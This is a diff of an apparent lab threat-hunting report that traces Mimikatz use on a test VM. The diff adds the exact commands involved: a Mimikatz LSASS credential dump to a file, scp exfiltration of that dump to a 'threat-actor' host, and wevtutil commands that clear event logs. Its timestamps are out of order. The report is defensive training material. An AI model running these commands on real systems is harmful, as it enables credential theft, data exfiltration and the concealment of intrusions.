@@ -145,32 +145,42 @@ DeviceFileEvents
 ## Chronological Events
 
 ### 1. File Download - Mimikatz Installer
-   * Timestamp: 2025-03-01T22:37:51.0340907Z
-   * Event: The user "cmh-cyber" downloaded a file named "mimikatz-master.zip" to the Downloads folder.
-   * Action: File download detected.
-   * File Path: C:\Users\cmh-cyber\Downloads\mimikatz-master.zip
+- **Timestamp:** `2025-03-01T22:37:51.0340907Z`
+- **Event:** The user "cmh-cyber" downloaded a file named "mimikatz-master.zip" to the Downloads folder.
+- **Action:** File download detected.
+- **File Path:** `C:\Users\cmh-cyber\Downloads\mimikatz-master.zip`
   
 ### 2. File Creation - Mimikatz Executable Extraction and Rename
-   * Timestamp: 2025-03-02T00:30:51.3210787Z
-   * Event: The user "cmh-cyber" extracted a file named "mimikatz-master.zip" to C:\Users\cmh-cyber\AppData\Local\Temp, and the executable mimikatz.exe was renamed to mimi64.exe.
-   * Action: File creation detected.
-   * File Path: C:\Users\cmh-cyber\AppData\Local\Temp\mimikatz\x64\mimi64.exe
+- **Timestamp:** `2025-03-02T00:30:51.3210787Z`
+- **Event:** The user "cmh-cyber" extracted a file named "mimikatz-master.zip" to `C:\Users\cmh-cyber\AppData\Local\Temp`, and the executable mimikatz.exe was renamed to mimi64.exe.
+- **Action:** File creation detected.
+- **File Path:** `C:\Users\cmh-cyber\AppData\Local\Temp\mimikatz\x64\mimi64.exe`
   
 ### 3. Process Execution - Mimikatz Execution
-   * Timestamp: 2025-02-27T18:00:34.050118Z
-   * Event: The user "cmh-cyber" ran the "mimi64.exe" executable successfully, and dumped credentials from LSASS into a file named "creddump.txt"
-   * Action: Process execution detected.
-   * File Path: C:\Users\cmh-cyber\AppData\Local\Temp\creddump.txt
+- **Timestamp:** `2025-02-27T18:00:34.050118Z`
+- **Event:** The user "cmh-cyber" ran the "mimi64.exe" executable successfully, and dumped credentials from LSASS into a file named "creddump.txt"
+- **Action:** Process execution detected.
+- **Command:** `mimi64.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\Users\<User>\AppData\Local\Temp\creddump.txt`
+- **File Path:** `C:\Users\cmh-cyber\AppData\Local\Temp\creddump.txt`
   
 ### 4. Data Exfiltration - Secure Copy to Remote Host
-   * Timestamp: 2025-03-02T01:43:25.6836023Z
-   * Event: The user "cmh-cyber" attempted to secure copy the file "creddump.txt" to a remote host located at "192.168.0.1", but the connection is determined to have failed.
-   * Action: Data exfiltration detected.
+- **Timestamp:** `2025-03-02T01:43:25.6836023Z`
+- **Event:** The user "cmh-cyber" attempted to secure copy the file "creddump.txt" to a remote host located at "192.168.0.1", but the connection is determined to have failed.
+- **Action:** Connection failed.
+- **Command:** `scp C:\Users\cmh-cyber\AppData\Local\Temp\creddump.txt threat-actor@192.168.0.1:/home/threat-actor`
 
 ### 5. Anti-Forensics - Removal of Logs
-   * Timestamp: 2025-03-02T01:43:25.6836023Z
-   * Event: The user "cmh-cyber" performed anti-forensic activities by clearing logs through a sequence of "wevtutil cl ..." commands and the removal of "ConsoleHost_history.txt".
-   * Action: Log and console history deletion detected.
+- **Timestamps:**
+  - `2025-03-02T01:44:28.1926195Z` - `ConsoleHost_history.txt` removed.
+  - `2025-03-02T01:44:39.019939Z` - `Application` log cleared.
+  - `2025-03-02T01:44:47.4380341Z` - `Security` log cleared.
+  - `2025-03-02T01:44:55.9288889Z` - `System` log created.
+- **Event:** The user "cmh-cyber" performed anti-forensic activities by clearing logs through a sequence of "wevtutil cl ..." commands and the removal of "ConsoleHost_history.txt".
+- **Action:** Log and console history deletion detected.
+- **Commands:**
+  - `wevtutil cl Application`
+  - `wevtutil cl Security`
+  - `wevtutil cl System`
 
 ---
 
@@ -186,7 +196,7 @@ Mimikatz usage was confirmed on device "cmh-cyber-vm". The device was isolated, 
 ---
 
 ## Created By:
-- **Author Name**: Josh Madakor
+- **Author Name**: Clay Hickman
 - **Author Contact**: https://www.linkedin.com/in/clay-h-980ba5262
 - **Date**: August 31, 2024
 
@@ -205,4 +215,4 @@ Mimikatz usage was confirmed on device "cmh-cyber-vm". The device was isolated, 
 ## Revision History:
 | **Version** | **Changes**                   | **Date**         | **Modified By**   |
 |-------------|-------------------------------|------------------|-------------------|
-| 1.0         | Initial draft                  | `September  6, 2024`  | `Josh Madakor`   
+| 1.0         | Initial draft                  | `September  6, 2024`  | `Clay Hickman`   
